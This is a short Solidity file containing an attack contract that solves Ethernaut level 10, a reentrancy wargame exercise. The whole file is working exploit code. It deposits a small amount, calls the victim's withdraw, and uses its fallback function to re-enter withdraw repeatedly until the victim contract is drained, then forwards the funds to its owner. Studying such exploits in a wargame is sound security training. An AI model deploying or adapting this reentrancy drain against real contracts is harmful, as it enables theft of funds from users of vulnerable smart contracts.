// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Attack Ethernaut 10 (reentrancy)
interface vContract10 {
    function donate(address _to) external payable;
    function withdraw(uint _amnt) external;
}

// level 10 ethernaut -- super simple reentrancy vuln
contract Attack10 {
    vContract10 private victim;
    address owner;


    constructor(address _victim) {
        victim = vContract10(_victim);
        owner = msg.sender;
    }

    function attack() public payable {
        require(msg.sender == owner, "Only owner");
        victim.donate{value: 100000000000000}(address(this));
        victim.withdraw(100000000000000);
        if(address(this).balance != 0){
            payable(owner).transfer(address(this).balance);
        }
    }

    fallback() external payable {
        require(msg.sender == address(victim));
        uint baseAmnt = 100000000000000;
        uint curBalance = address(victim).balance;
        if (curBalance >= baseAmnt) {
            victim.withdraw(baseAmnt);
        } else {
            payable(owner).transfer(address(this).balance);
        }
    }
}